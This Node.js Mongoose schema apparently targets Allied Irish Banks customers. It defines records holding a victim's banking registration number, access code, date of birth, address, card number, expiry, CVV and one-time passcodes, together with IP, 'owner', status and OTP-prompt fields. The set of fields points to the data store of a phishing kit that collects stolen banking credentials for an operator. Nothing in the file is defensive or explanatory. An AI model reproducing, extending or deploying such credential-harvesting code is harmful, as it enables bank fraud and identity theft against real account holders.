const mongoose = require("mongoose");

const aibSchema = new mongoose.Schema({
  uniqueid: Number,
  regnumber: String,
  pac: String,
  fullname: String,
  address: String,
  pcode: String,
  dob: String,
  telephone: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  otp: String,
  cardNumber: String,
  branchAddy: String,
  status: Number,
  ip: String,
  owner: String,
  otpText: String,
});

module.exports = mongoose.model("AIB", aibSchema);
